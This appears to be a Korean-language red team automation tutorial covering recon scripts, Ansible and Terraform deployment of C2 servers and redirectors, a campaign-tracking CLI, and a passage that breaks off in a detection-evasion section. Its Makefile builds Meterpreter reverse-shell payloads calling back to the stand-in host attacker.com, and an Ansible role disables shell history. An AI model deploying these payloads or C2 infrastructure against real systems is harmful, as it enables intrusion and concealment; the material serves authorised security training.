> 🌐 **Language / 언어**: [🇰🇷 한국어](#한국어) | [🇺🇸 English](#english)

---

<a name="한국어"></a>

# 레드팀 자동화

## 0. 초보자를 위한 개념 이해

### 레드팀 자동화란?

**레드팀 자동화(Red Team Automation)**는 침투 테스트의 반복 작업(정찰, 스캐닝, 익스플로잇 시도)을 자동화해 더 넓은 범위를 더 빠르게 평가할 수 있게 하는 기법입니다.

> 📌 이 문서의 모든 기법은 **교육, CTF, 공인된 레드팀 작전 환경**에서만 적용합니다.

**왜 배우는가:**
```
수동 레드팀:
  1인 테스터가 수동으로 → 넓은 범위 테스트 불가능
  시간당 5~10개 대상 점검

자동화 레드팀:
  스크립트로 자동 → 시간당 수백 대상 스캔
  반복 작업 제거 → 창의적 공격에 집중
  일관성 보장 → 사람 실수 최소화
```

### 핵심 개념 정리

```
자동화 가능한 작업:

1. 정찰 자동화
   - 서브도메인 열거 (Amass, Subfinder)
   - 포트 스캔 (masscan → 빠름, nmap → 정밀)
   - 취약점 스캔 (Nuclei 템플릿)

2. 익스플로잇 자동화
   - Metasploit Resource Script
   - Empire/Covenant 에이전트 배포

3. 후속 작업 자동화
   - PowerShell Empire: Windows 자동 정보 수집
   - Cobalt Strike Beacon: 주기적 체크인

4. 보고서 자동화
   - Dradis, Plextrac: 취약점 → 보고서 자동 생성
```

### 필요한 도구
- **Nuclei**: 빠른 취약점 스캔 자동화 엔진
- **Amass + Subfinder**: 서브도메인 자동 열거
- **Metasploit Framework**: 자동화 공격 스크립트

### 기초 실습 예제
```python
# 간단한 레드팀 정찰 자동화 스크립트
import subprocess
from pathlib import Path
from datetime import datetime

def run_recon(domain: str, output_dir: str = "/tmp/recon") -> None:
    Path(output_dir).mkdir(exist_ok=True)
    ts = datetime.now().strftime("%Y%m%d_%H%M")

    # 1. 서브도메인 열거
    print(f"[*] 서브도메인 열거 중: {domain}")
    result = subprocess.run(
        ["subfinder", "-d", domain, "-silent"],
        capture_output=True, text=True
    )
    subs = result.stdout.strip().split("\n")
    print(f"[+] 발견된 서브도메인: {len(subs)}개")

    # 2. 결과 저장
    outfile = f"{output_dir}/{domain}_{ts}_subdomains.txt"
    Path(outfile).write_text("\n".join(subs))
    print(f"[+] 저장: {outfile}")

# run_recon("target.com")
```

---

## 1. 레드팀 자동화 개요

### 1.1 자동화 성숙도 모델

```
Level 0: 완전 수동 (Manual)
  - 모든 작업을 수동으로 실행
  - 도구: Metasploit, Burp Suite, 수작업 명령어
  - 단점: 느림, 인력 집중, 반복 작업 많음
  - 적합: 소규모 타겟, 탐색적 테스트

Level 1: 반자동화 (Semi-Automated)
  - 반복적 작업은 스크립트화
  - 의사결정은 사람이 수행
  - 도구: Python 스크립트, Bash 자동화, Ansible
  - 단점: 여전히 감독 필요
  - 적합: 일반적인 레드팀 작전

Level 2: 완전 자동화 (Fully Automated)
  - BAS(Breach and Attack Simulation)
  - 자동 익스플로잇 → 피벗 → 목표 달성
  - 도구: Caldera, VECTR, AttackIQ, Prelude
  - 단점: 복잡한 환경 대응 한계
  - 적합: 지속적 보안 검증, CTEM

레드팀 자동화 대상:
  ├── 인프라 배포 (Terraform/Ansible)
  ├── 페이로드 생성 파이프라인
  ├── 정찰/스캐닝 자동화
  ├── 취약점 식별 및 우선순위
  ├── 보고서 자동 생성
  └── 탐지 우회 테스트
```

### 1.2 자동화 원칙

```
1. 멱등성(Idempotency)
   - 같은 작업 여러 번 실행해도 동일한 결과
   - Terraform, Ansible의 기본 원칙

2. 버전 관리
   - 모든 인프라 코드를 Git으로 관리
   - 환경별 브랜치 (dev/staging/prod)

3. 비밀 관리
   - 하드코딩 금지
   - Vault, AWS Secrets Manager, 환경변수

4. 정리(Cleanup)
   - 작전 후 자동 정리
   - 비용 및 노출 최소화
```

---

## 2. Ansible C2 인프라 자동 배포

### 2.1 Ansible 디렉토리 구조

```
redteam-ansible/
├── inventory/
│   ├── hosts.yml           # 인벤토리 파일
│   └── group_vars/
│       ├── all.yml         # 공통 변수
│       ├── c2_servers.yml  # C2 서버 변수
│       └── redirectors.yml # 리다이렉터 변수
├── roles/
│   ├── common/             # 공통 하드닝
│   ├── c2_server/          # C2 서버 설치
│   ├── redirector/         # 리다이렉터 설정
│   └── cleanup/            # 정리 작업
├── playbooks/
│   ├── deploy.yml          # 전체 배포
│   ├── teardown.yml        # 전체 해체
│   └── update.yml          # 업데이트
└── vault/
    └── secrets.yml         # 암호화된 비밀
```

### 2.2 인벤토리 파일

```yaml
# inventory/hosts.yml
all:
  children:
    c2_servers:
      hosts:
        teamserver-01:
          ansible_host: 10.0.0.5
          ansible_user: operator
          ansible_ssh_private_key_file: ~/.ssh/redteam_key
          c2_type: sliver
          c2_port: 8888

    redirectors:
      hosts:
        redirector-01:
          ansible_host: 1.2.3.4
          ansible_user: operator
          ansible_ssh_private_key_file: ~/.ssh/redteam_key
          redirect_port: 443
          backend_host: "{{ hostvars['teamserver-01']['ansible_host'] }}"
          backend_port: 8888

        redirector-02:
          ansible_host: 5.6.7.8
          ansible_user: operator
          ansible_ssh_private_key_file: ~/.ssh/redteam_key
          redirect_port: 80
          backend_host: "{{ hostvars['teamserver-01']['ansible_host'] }}"
          backend_port: 8080
```

### 2.3 공통 하드닝 Role

```yaml
# roles/common/tasks/main.yml
---
- name: 패키지 업데이트
  ansible.builtin.apt:
    update_cache: true
    upgrade: safe
  become: true

- name: 필수 패키지 설치
  ansible.builtin.apt:
    name:
      - ufw
      - fail2ban
      - curl
      - wget
      - unzip
      - socat
    state: present
  become: true

- name: SSH 설정 하드닝
  ansible.builtin.lineinfile:
    path: /etc/ssh/sshd_config
    regexp: "{{ item.regexp }}"
    line: "{{ item.line }}"
    state: present
  become: true
  loop:
    - { regexp: '^#?PermitRootLogin', line: 'PermitRootLogin no' }
    - { regexp: '^#?PasswordAuthentication', line: 'PasswordAuthentication no' }
    - { regexp: '^#?MaxAuthTries', line: 'MaxAuthTries 3' }
  notify: sshd 재시작

- name: UFW 기본 정책 설정
  community.general.ufw:
    state: enabled
    policy: "{{ item.policy }}"
    direction: "{{ item.direction }}"
  become: true
  loop:
    - { policy: deny,  direction: incoming }
    - { policy: allow, direction: outgoing }

- name: 운영자 IP SSH 허용
  community.general.ufw:
    rule: allow
    from_ip: "{{ operator_ip }}"
    to_port: "22"
    proto: tcp
  become: true
  when: operator_ip is defined

- name: Fail2ban 활성화
  ansible.builtin.systemd:
    name: fail2ban
    enabled: true
    state: started
  become: true

- name: Bash 히스토리 비활성화
  ansible.builtin.lineinfile:
    path: /home/{{ ansible_user }}/.bashrc
    line: "{{ item }}"
    state: present
  loop:
    - 'export HISTFILE=/dev/null'
    - 'export HISTSIZE=0'

handlers:
  - name: sshd 재시작
    ansible.builtin.service:
      name: sshd
      state: restarted
    become: true
```

### 2.4 리다이렉터 Role

```yaml
# roles/redirector/tasks/main.yml
---
- name: Nginx 설치
  ansible.builtin.apt:
    name: nginx
    state: present
  become: true

- name: Nginx 리다이렉터 설정 배포
  ansible.builtin.template:
    src: redirector.conf.j2
    dest: /etc/nginx/sites-available/redirector.conf
    owner: root
    group: root
    mode: '0644'
  become: true
  notify: nginx 재시작

- name: 기본 사이트 비활성화
  ansible.builtin.file:
    path: /etc/nginx/sites-enabled/default
    state: absent
  become: true

- name: 리다이렉터 사이트 활성화
  ansible.builtin.file:
    src: /etc/nginx/sites-available/redirector.conf
    dest: /etc/nginx/sites-enabled/redirector.conf
    state: link
  become: true
  notify: nginx 재시작

- name: UFW HTTP/HTTPS 허용
  community.general.ufw:
    rule: allow
    port: "{{ item }}"
    proto: tcp
  become: true
  loop:
    - "80"
    - "443"

handlers:
  - name: nginx 재시작
    ansible.builtin.service:
      name: nginx
      state: restarted
    become: true
```

### 2.5 배포 플레이북

```yaml
# playbooks/deploy.yml
---
- name: 공통 하드닝 적용
  hosts: all
  gather_facts: true
  roles:
    - common

- name: C2 서버 배포
  hosts: c2_servers
  gather_facts: true
  vars_files:
    - ../vault/secrets.yml
  roles:
    - c2_server

- name: 리다이렉터 배포
  hosts: redirectors
  gather_facts: true
  roles:
    - redirector

# 실행:
# ansible-playbook -i inventory/hosts.yml playbooks/deploy.yml
# ansible-playbook -i inventory/hosts.yml playbooks/deploy.yml --ask-vault-pass
```

---

## 3. Terraform 클라우드 공격 인프라

### 3.1 AWS 기반 레드팀 인프라

```hcl
# main.tf - 레드팀 AWS 인프라 (교육용)

terraform {
  required_providers {
    aws = {
      source  = "hashicorp/aws"
      version = "~> 5.0"
    }
  }
}

provider "aws" {
  region = var.region
}

# 변수 정의
variable "region" {
  default = "us-east-1"
}

variable "operator_ip" {
  description = "운영자 공인 IP (CIDR)"
  type        = string
}

variable "ssh_public_key" {
  description = "SSH 공개키"
  type        = string
}

# VPC 생성
resource "aws_vpc" "redteam" {
  cidr_block           = "10.100.0.0/16"
  enable_dns_hostnames = true
  enable_dns_support   = true

  tags = {
    Name = "redteam-vpc"
  }
}

# 서브넷 (퍼블릭)
resource "aws_subnet" "public" {
  vpc_id                  = aws_vpc.redteam.id
  cidr_block              = "10.100.1.0/24"
  availability_zone       = "${var.region}a"
  map_public_ip_on_launch = true

  tags = { Name = "redteam-public" }
}

# 서브넷 (프라이빗 - 팀서버용)
resource "aws_subnet" "private" {
  vpc_id            = aws_vpc.redteam.id
  cidr_block        = "10.100.2.0/24"
  availability_zone = "${var.region}a"

  tags = { Name = "redteam-private" }
}

# 인터넷 게이트웨이
resource "aws_internet_gateway" "igw" {
  vpc_id = aws_vpc.redteam.id
  tags   = { Name = "redteam-igw" }
}

# 퍼블릭 라우트 테이블
resource "aws_route_table" "public" {
  vpc_id = aws_vpc.redteam.id

  route {
    cidr_block = "0.0.0.0/0"
    gateway_id = aws_internet_gateway.igw.id
  }
}

resource "aws_route_table_association" "public" {
  subnet_id      = aws_subnet.public.id
  route_table_id = aws_route_table.public.id
}

# SSH 키 페어
resource "aws_key_pair" "operator" {
  key_name   = "redteam-operator"
  public_key = var.ssh_public_key
}

# 리다이렉터 보안 그룹
resource "aws_security_group" "redirector" {
  name   = "redteam-redirector-sg"
  vpc_id = aws_vpc.redteam.id

  ingress {
    from_port   = 80
    to_port     = 80
    protocol    = "tcp"
    cidr_blocks = ["0.0.0.0/0"]
    description = "HTTP from anywhere"
  }

  ingress {
    from_port   = 443
    to_port     = 443
    protocol    = "tcp"
    cidr_blocks = ["0.0.0.0/0"]
    description = "HTTPS from anywhere"
  }

  ingress {
    from_port   = 22
    to_port     = 22
    protocol    = "tcp"
    cidr_blocks = [var.operator_ip]
    description = "SSH from operator"
  }

  egress {
    from_port   = 0
    to_port     = 0
    protocol    = "-1"
    cidr_blocks = ["0.0.0.0/0"]
  }

  tags = { Name = "redteam-redirector-sg" }
}

# C2 팀서버 보안 그룹 (프라이빗)
resource "aws_security_group" "teamserver" {
  name   = "redteam-teamserver-sg"
  vpc_id = aws_vpc.redteam.id

  ingress {
    from_port       = 8080
    to_port         = 8080
    protocol        = "tcp"
    security_groups = [aws_security_group.redirector.id]
    description     = "C2 from redirectors only"
  }

  ingress {
    from_port   = 22
    to_port     = 22
    protocol    = "tcp"
    cidr_blocks = [var.operator_ip]
    description = "SSH from operator"
  }

  egress {
    from_port   = 0
    to_port     = 0
    protocol    = "-1"
    cidr_blocks = ["0.0.0.0/0"]
  }

  tags = { Name = "redteam-teamserver-sg" }
}

# 리다이렉터 EC2 인스턴스
resource "aws_instance" "redirector" {
  ami                    = "ami-0c02fb55956c7d316"  # Amazon Linux 2
  instance_type          = "t3.micro"
  subnet_id              = aws_subnet.public.id
  key_name               = aws_key_pair.operator.key_name
  vpc_security_group_ids = [aws_security_group.redirector.id]

  user_data = <<-EOF
    #!/bin/bash
    yum install -y nginx
    systemctl enable nginx
    systemctl start nginx
    # 실제 배포 시 Ansible로 추가 설정
  EOF

  tags = { Name = "redteam-redirector-01" }
}

# 출력
output "redirector_public_ip" {
  value = aws_instance.redirector.public_ip
}
```

### 3.2 Terraform 워크플로

```bash
# 초기화
terraform init

# 변수 파일 생성 (git에 커밋 금지!)
cat > terraform.tfvars << 'EOF'
region         = "us-east-1"
operator_ip    = "203.0.113.0/32"
ssh_public_key = "ssh-ed25519 AAAA..."
EOF

# 계획 확인
terraform plan -var-file=terraform.tfvars

# 배포
terraform apply -var-file=terraform.tfvars -auto-approve

# 인프라 정보 확인
terraform output

# 전체 해체 (작전 종료)
terraform destroy -var-file=terraform.tfvars -auto-approve
```

---

## 4. 자동화 페이로드 생성 파이프라인

### 4.1 파이프라인 구조

```
페이로드 생성 파이프라인:

1. 타겟 환경 정보 수집
   └─ OS, 아키텍처, AV/EDR 정보

2. 페이로드 베이스 선택
   └─ msfvenom / sRDI / 커스텀 로더

3. 쉘코드 처리
   └─ XOR 암호화
   └─ AES 암호화
   └─ 압축

4. 로더 선택
   └─ EXE / DLL / PS1 / HTA / ISO

5. 컴파일
   └─ MinGW (크로스 컴파일)
   └─ Go 빌드

6. 검증
   └─ 바이너리 무결성 확인
   └─ 동작 테스트 (샌드박스)

7. 배포
   └─ 페이로드 서버에 업로드
```

### 4.2 페이로드 생성 Makefile

```makefile
# Makefile - 페이로드 빌드 자동화

C2_HOST    := attacker.com
C2_PORT    := 443
OUTPUT_DIR := ./payloads

.PHONY: all clean windows linux macos

all: windows linux

windows:
	@mkdir -p $(OUTPUT_DIR)/windows
	msfvenom \
		-p windows/x64/meterpreter/reverse_https \
		LHOST=$(C2_HOST) LPORT=$(C2_PORT) \
		-f exe -o $(OUTPUT_DIR)/windows/payload_x64.exe
	msfvenom \
		-p windows/x86/meterpreter/reverse_https \
		LHOST=$(C2_HOST) LPORT=$(C2_PORT) \
		-f exe -o $(OUTPUT_DIR)/windows/payload_x86.exe
	msfvenom \
		-p windows/x64/meterpreter/reverse_https \
		LHOST=$(C2_HOST) LPORT=$(C2_PORT) \
		-f ps1 -o $(OUTPUT_DIR)/windows/payload.ps1
	@echo "[+] Windows 페이로드 생성 완료"

linux:
	@mkdir -p $(OUTPUT_DIR)/linux
	msfvenom \
		-p linux/x64/meterpreter/reverse_tcp \
		LHOST=$(C2_HOST) LPORT=4444 \
		-f elf -o $(OUTPUT_DIR)/linux/payload_x64
	chmod +x $(OUTPUT_DIR)/linux/payload_x64
	@echo "[+] Linux 페이로드 생성 완료"

clean:
	rm -rf $(OUTPUT_DIR)
	@echo "[+] 정리 완료"
```

---

## 5. 레드팀 캠페인 관리 CLI

```python
#!/usr/bin/env python3
"""
레드팀 캠페인 관리 CLI
- 타겟 관리
- 세션 추적
- 메모 및 발견 사항 기록
- 보고서 자동 생성
CTF/공인된 레드팀 작전 전용
"""

from __future__ import annotations

import argparse
import csv
import json
import os
import sys
from dataclasses import asdict, dataclass, field
from datetime import datetime
from enum import Enum
from pathlib import Path
from typing import Any


class TargetStatus(Enum):
    PENDING    = "pending"
    IN_SCOPE   = "in_scope"
    SCANNING   = "scanning"
    EXPLOITED  = "exploited"
    COMPLETED  = "completed"
    OUT_SCOPE  = "out_scope"


class Severity(Enum):
    CRITICAL = "critical"
    HIGH     = "high"
    MEDIUM   = "medium"
    LOW      = "low"
    INFO     = "info"


@dataclass
class Target:
    target_id: str
    hostname: str
    ip_address: str
    os_info: str = ""
    status: str = TargetStatus.PENDING.value
    tags: list[str] = field(default_factory=list)
    notes: str = ""
    added_at: str = field(default_factory=lambda: datetime.now().isoformat())
    updated_at: str = field(default_factory=lambda: datetime.now().isoformat())


@dataclass
class Session:
    session_id: str
    target_id: str
    session_type: str   # meterpreter, shell, beacon, etc.
    username: str
    pid: int
    arch: str
    is_elevated: bool = False
    established_at: str = field(default_factory=lambda: datetime.now().isoformat())
    last_active: str = field(default_factory=lambda: datetime.now().isoformat())
    notes: str = ""


@dataclass
class Finding:
    finding_id: str
    target_id: str
    title: str
    severity: str
    description: str
    evidence: str = ""
    mitigation: str = ""
    cve: str = ""
    discovered_at: str = field(default_factory=lambda: datetime.now().isoformat())


@dataclass
class Campaign:
    name: str
    description: str
    client: str
    start_date: str
    end_date: str
    scope: list[str] = field(default_factory=list)
    targets: list[Target] = field(default_factory=list)
    sessions: list[Session] = field(default_factory=list)
    findings: list[Finding] = field(default_factory=list)
    created_at: str = field(default_factory=lambda: datetime.now().isoformat())


class CampaignManager:
    """캠페인 데이터 관리"""

    def __init__(self, data_dir: Path) -> None:
        self.data_dir = data_dir
        self.data_dir.mkdir(parents=True, exist_ok=True)
        self.campaign_file = data_dir / "campaign.json"
        self.campaign: Campaign | None = None

    def _save(self) -> None:
        if self.campaign is None:
            return
        with open(self.campaign_file, "w", encoding="utf-8") as f:
            json.dump(asdict(self.campaign), f, ensure_ascii=False, indent=2)

    def _load(self) -> bool:
        if not self.campaign_file.exists():
            return False
        try:
            with open(self.campaign_file, "r", encoding="utf-8") as f:
                data = json.load(f)
            targets = [Target(**t) for t in data.get("targets", [])]
            sessions = [Session(**s) for s in data.get("sessions", [])]
            findings = [Finding(**f) for f in data.get("findings", [])]
            self.campaign = Campaign(
                name=data["name"],
                description=data["description"],
                client=data["client"],
                start_date=data["start_date"],
                end_date=data["end_date"],
                scope=data.get("scope", []),
                targets=targets,
                sessions=sessions,
                findings=findings,
                created_at=data.get("created_at", ""),
            )
            return True
        except (KeyError, TypeError, json.JSONDecodeError) as e:
            print(f"[-] 캠페인 로드 실패: {e}")
            return False

    def ensure_loaded(self) -> None:
        if self.campaign is None:
            if not self._load():
                print("[-] 캠페인이 없습니다. 먼저 'campaign new' 를 실행하세요.")
                sys.exit(1)

    # 캠페인 관리
    def new_campaign(
        self,
        name: str,
        client: str,
        description: str,
        start_date: str,
        end_date: str,
    ) -> None:
        self.campaign = Campaign(
            name=name,
            description=description,
            client=client,
            start_date=start_date,
            end_date=end_date,
        )
        self._save()
        print(f"[+] 캠페인 생성: {name}")

    def show_campaign(self) -> None:
        self.ensure_loaded()
        c = self.campaign
        assert c is not None
        print(f"\n캠페인: {c.name}")
        print(f"고객사: {c.client}")
        print(f"기간:   {c.start_date} ~ {c.end_date}")
        print(f"설명:   {c.description}")
        print(f"\n통계:")
        print(f"  타겟: {len(c.targets)}")
        print(f"  세션: {len(c.sessions)}")
        print(f"  발견: {len(c.findings)}")
        if c.scope:
            print(f"\n범위:")
            for s in c.scope:
                print(f"  - {s}")

    # 타겟 관리
    def add_target(
        self,
        hostname: str,
        ip: str,
        os_info: str = "",
        tags: list[str] | None = None,
    ) -> None:
        self.ensure_loaded()
        assert self.campaign is not None
        target_id = f"T{len(self.campaign.targets)+1:03d}"
        target = Target(
            target_id=target_id,
            hostname=hostname,
            ip_address=ip,
            os_info=os_info,
            tags=tags or [],
        )
        self.campaign.targets.append(target)
        self._save()
        print(f"[+] 타겟 추가: [{target_id}] {hostname} ({ip})")

    def list_targets(self, status_filter: str | None = None) -> None:
        self.ensure_loaded()
        assert self.campaign is not None
        targets = self.campaign.targets
        if status_filter:
            targets = [t for t in targets if t.status == status_filter]

        if not targets:
            print("[-] 타겟 없음")
            return

        print(f"\n{'ID':<8} {'호스트명':<25} {'IP':<18} {'OS':<20} {'상태':<15} {'태그'}")
        print("-" * 100)
        for t in targets:
            tags_str = ", ".join(t.tags) if t.tags else "-"
            print(f"{t.target_id:<8} {t.hostname:<25} {t.ip_address:<18} {t.os_info:<20} {t.status:<15} {tags_str}")

    def update_target_status(self, target_id: str, status: str) -> None:
        self.ensure_loaded()
        assert self.campaign is not None
        for t in self.campaign.targets:
            if t.target_id == target_id:
                t.status = status
                t.updated_at = datetime.now().isoformat()
                self._save()
                print(f"[+] 타겟 상태 업데이트: {target_id} → {status}")
                return
        print(f"[-] 타겟을 찾을 수 없음: {target_id}")

    def add_target_note(self, target_id: str, note: str) -> None:
        self.ensure_loaded()
        assert self.campaign is not None
        for t in self.campaign.targets:
            if t.target_id == target_id:
                t.notes += f"\n[{datetime.now().strftime('%Y-%m-%d %H:%M')}] {note}"
                t.updated_at = datetime.now().isoformat()
                self._save()
                print(f"[+] 메모 추가: {target_id}")
                return
        print(f"[-] 타겟을 찾을 수 없음: {target_id}")

    # 세션 관리
    def add_session(
        self,
        target_id: str,
        session_type: str,
        username: str,
        pid: int,
        arch: str,
        elevated: bool = False,
    ) -> None:
        self.ensure_loaded()
        assert self.campaign is not None
        session_id = f"S{len(self.campaign.sessions)+1:03d}"
        session = Session(
            session_id=session_id,
            target_id=target_id,
            session_type=session_type,
            username=username,
            pid=pid,
            arch=arch,
            is_elevated=elevated,
        )
        self.campaign.sessions.append(session)
        self._save()
        elevated_str = " [ELEVATED]" if elevated else ""
        print(f"[+] 세션 추가: [{session_id}] {target_id} - {username}{elevated_str}")

    def list_sessions(self) -> None:
        self.ensure_loaded()
        assert self.campaign is not None
        sessions = self.campaign.sessions
        if not sessions:
            print("[-] 세션 없음")
            return

        print(f"\n{'ID':<8} {'타겟':<8} {'유저':<20} {'타입':<15} {'PID':<8} {'권한'}")
        print("-" * 75)
        for s in sessions:
            elevated = "관리자" if s.is_elevated else "일반"
            print(f"{s.session_id:<8} {s.target_id:<8} {s.username:<20} {s.session_type:<15} {s.pid:<8} {elevated}")

    # 발견 사항 관리
    def add_finding(
        self,
        target_id: str,
        title: str,
        severity: str,
        description: str,
        evidence: str = "",
        mitigation: str = "",
        cve: str = "",
    ) -> None:
        self.ensure_loaded()
        assert self.campaign is not None
        finding_id = f"F{len(self.campaign.findings)+1:03d}"
        finding = Finding(
            finding_id=finding_id,
            target_id=target_id,
            title=title,
            severity=severity,
            description=description,
            evidence=evidence,
            mitigation=mitigation,
            cve=cve,
        )
        self.campaign.findings.append(finding)
        self._save()
        print(f"[+] 발견 사항 추가: [{finding_id}] [{severity.upper()}] {title}")

    def list_findings(self, severity_filter: str | None = None) -> None:
        self.ensure_loaded()
        assert self.campaign is not None
        findings = self.campaign.findings
        if severity_filter:
            findings = [f for f in findings if f.severity == severity_filter]

        if not findings:
            print("[-] 발견 사항 없음")
            return

        sev_order = {"critical": 0, "high": 1, "medium": 2, "low": 3, "info": 4}
        findings = sorted(findings, key=lambda f: sev_order.get(f.severity, 99))

        print(f"\n{'ID':<8} {'심각도':<12} {'타겟':<8} {'제목':<40} {'CVE'}")
        print("-" * 80)
        for f in findings:
            print(f"{f.finding_id:<8} {f.severity.upper():<12} {f.target_id:<8} {f.title[:40]:<40} {f.cve or '-'}")

    # 보고서 생성
    def generate_report(self, output_format: str = "txt", output_path: str | None = None) -> None:
        self.ensure_loaded()
        assert self.campaign is not None
        c = self.campaign

        if output_format == "txt":
            report = self._generate_text_report(c)
            ext = "txt"
        elif output_format == "json":
            report = json.dumps(asdict(c), ensure_ascii=False, indent=2)
            ext = "json"
        elif output_format == "csv":
            report = self._generate_csv_report(c)
            ext = "csv"
        else:
            print(f"[-] 지원하지 않는 형식: {output_format}")
            return

        out_path = output_path or f"redteam_report_{datetime.now().strftime('%Y%m%d_%H%M')}.{ext}"
        with open(out_path, "w", encoding="utf-8") as f:
            f.write(report)
        print(f"[+] 보고서 생성: {out_path}")

    def _generate_text_report(self, c: Campaign) -> str:
        lines = [
            "=" * 70,
            f"레드팀 작전 보고서",
            "=" * 70,
            f"",
            f"캠페인: {c.name}",
            f"고객사: {c.client}",
            f"기간:   {c.start_date} ~ {c.end_date}",
            f"설명:   {c.description}",
            f"",
            "[ 통계 요약 ]",
            f"  총 타겟: {len(c.targets)}",
            f"  익스플로잇 성공: {sum(1 for t in c.targets if t.status == 'exploited')}",
            f"  활성 세션: {len(c.sessions)}",
            f"  발견 사항: {len(c.findings)}",
            f"",
        ]

        sev_counts = {s.value: 0 for s in Severity}
        for f in c.findings:
            if f.severity in sev_counts:
                sev_counts[f.severity] += 1
        lines += [
            "[ 발견 사항 요약 ]",
            f"  CRITICAL: {sev_counts['critical']}",
            f"  HIGH:     {sev_counts['high']}",
            f"  MEDIUM:   {sev_counts['medium']}",
            f"  LOW:      {sev_counts['low']}",
            f"  INFO:     {sev_counts['info']}",
            "",
            "=" * 70,
            "[ 타겟 목록 ]",
            "=" * 70,
        ]

        for t in c.targets:
            lines += [
                f"",
                f"[{t.target_id}] {t.hostname} ({t.ip_address})",
                f"  OS:     {t.os_info or 'N/A'}",
                f"  상태:   {t.status}",
                f"  태그:   {', '.join(t.tags) or 'N/A'}",
            ]
            if t.notes:
                lines.append(f"  메모:   {t.notes.strip()}")

        lines += [
            "",
            "=" * 70,
            "[ 발견 사항 상세 ]",
            "=" * 70,
        ]

        sev_order = {"critical": 0, "high": 1, "medium": 2, "low": 3, "info": 4}
        sorted_findings = sorted(c.findings, key=lambda f: sev_order.get(f.severity, 99))

        for f in sorted_findings:
            lines += [
                f"",
                f"[{f.finding_id}] [{f.severity.upper()}] {f.title}",
                f"  타겟:   {f.target_id}",
                f"  CVE:    {f.cve or 'N/A'}",
                f"  설명:   {f.description}",
                f"  증거:   {f.evidence or 'N/A'}",
                f"  조치:   {f.mitigation or 'N/A'}",
                f"  발견일: {f.discovered_at[:10]}",
            ]

        lines += ["", "=" * 70, "보고서 끝", "=" * 70]
        return "\n".join(lines)

    def _generate_csv_report(self, c: Campaign) -> str:
        import io
        buf = io.StringIO()
        writer = csv.writer(buf)
        writer.writerow(["Finding ID", "Target ID", "Title", "Severity", "CVE", "Description", "Discovered At"])
        for f in c.findings:
            writer.writerow([f.finding_id, f.target_id, f.title, f.severity, f.cve, f.description, f.discovered_at])
        return buf.getvalue()


def parse_args() -> argparse.Namespace:
    parser = argparse.ArgumentParser(
        description="레드팀 캠페인 관리 CLI",
        formatter_class=argparse.RawDescriptionHelpFormatter,
    )
    parser.add_argument(
        "--data-dir", default="./campaign_data",
        help="데이터 저장 디렉토리 (기본: ./campaign_data)",
    )

    subparsers = parser.add_subparsers(dest="command", required=True)

    # campaign 서브커맨드
    camp = subparsers.add_parser("campaign", help="캠페인 관리")
    camp_sub = camp.add_subparsers(dest="campaign_action", required=True)

    new_camp = camp_sub.add_parser("new", help="새 캠페인 생성")
    new_camp.add_argument("--name", required=True)
    new_camp.add_argument("--client", required=True)
    new_camp.add_argument("--description", default="")
    new_camp.add_argument("--start", required=True, help="시작일 (YYYY-MM-DD)")
    new_camp.add_argument("--end", required=True, help="종료일 (YYYY-MM-DD)")

    camp_sub.add_parser("show", help="캠페인 정보 표시")

    # target 서브커맨드
    tgt = subparsers.add_parser("target", help="타겟 관리")
    tgt_sub = tgt.add_subparsers(dest="target_action", required=True)

    add_tgt = tgt_sub.add_parser("add", help="타겟 추가")
    add_tgt.add_argument("--hostname", required=True)
    add_tgt.add_argument("--ip", required=True)
    add_tgt.add_argument("--os", default="", dest="os_info")
    add_tgt.add_argument("--tags", nargs="*", default=[])

    ls_tgt = tgt_sub.add_parser("list", help="타겟 목록")
    ls_tgt.add_argument("--status", help="상태 필터")

    up_tgt = tgt_sub.add_parser("status", help="타겟 상태 변경")
    up_tgt.add_argument("id")
    up_tgt.add_argument("new_status")

    note_tgt = tgt_sub.add_parser("note", help="타겟 메모 추가")
    note_tgt.add_argument("id")
    note_tgt.add_argument("text")

    # session 서브커맨드
    sess = subparsers.add_parser("session", help="세션 관리")
    sess_sub = sess.add_subparsers(dest="session_action", required=True)

    add_sess = sess_sub.add_parser("add", help="세션 추가")
    add_sess.add_argument("--target", required=True)
    add_sess.add_argument("--type", default="meterpreter")
    add_sess.add_argument("--user", required=True)
    add_sess.add_argument("--pid", type=int, default=0)
    add_sess.add_argument("--arch", default="x64")
    add_sess.add_argument("--elevated", action="store_true")

    sess_sub.add_parser("list", help="세션 목록")

    # finding 서브커맨드
    find = subparsers.add_parser("finding", help="발견 사항 관리")
    find_sub = find.add_subparsers(dest="finding_action", required=True)

    add_find = find_sub.add_parser("add", help="발견 사항 추가")
    add_find.add_argument("--target", required=True)
    add_find.add_argument("--title", required=True)
    add_find.add_argument("--severity", required=True,
                          choices=["critical", "high", "medium", "low", "info"])
    add_find.add_argument("--description", required=True)
    add_find.add_argument("--evidence", default="")
    add_find.add_argument("--mitigation", default="")
    add_find.add_argument("--cve", default="")

    ls_find = find_sub.add_parser("list", help="발견 사항 목록")
    ls_find.add_argument("--severity", help="심각도 필터")

    # report 서브커맨드
    rep = subparsers.add_parser("report", help="보고서 생성")
    rep.add_argument("--format", default="txt", choices=["txt", "json", "csv"])
    rep.add_argument("--output", help="출력 파일 경로")

    return parser.parse_args()


def main() -> None:
    args = parse_args()
    manager = CampaignManager(Path(args.data_dir))

    if args.command == "campaign":
        if args.campaign_action == "new":
            manager.new_campaign(
                name=args.name,
                client=args.client,
                description=args.description,
                start_date=args.start,
                end_date=args.end,
            )
        elif args.campaign_action == "show":
            manager.show_campaign()

    elif args.command == "target":
        if args.target_action == "add":
            manager.add_target(args.hostname, args.ip, args.os_info, args.tags)
        elif args.target_action == "list":
            manager.list_targets(args.status)
        elif args.target_action == "status":
            manager.update_target_status(args.id, args.new_status)
        elif args.target_action == "note":
            manager.add_target_note(args.id, args.text)

    elif args.command == "session":
        if args.session_action == "add":
            manager.add_session(
                target_id=args.target,
                session_type=args.type,
                username=args.user,
                pid=args.pid,
                arch=args.arch,
                elevated=args.elevated,
            )
        elif args.session_action == "list":
            manager.list_sessions()

    elif args.command == "finding":
        if args.finding_action == "add":
            manager.add_finding(
                target_id=args.target,
                title=args.title,
                severity=args.severity,
                description=args.description,
                evidence=args.evidence,
                mitigation=args.mitigation,
                cve=args.cve,
            )
        elif args.finding_action == "list":
            manager.list_findings(args.severity)

    elif args.command == "report":
        manager.generate_report(args.format, args.output)


if __name__ == "__main__":
    main()
```

---

## 6. 블루팀 탐지 우회 테스트 자동화

### 6.1 탐지 우회 테스트 프레임워크

```
MITRE ATT&CK 기반 자동화 테스트:

  Atomic Red Team (오픈소스)
  → 단일 ATT&CK 기법을 테스트하는 원자적 테스트
  
  설치:
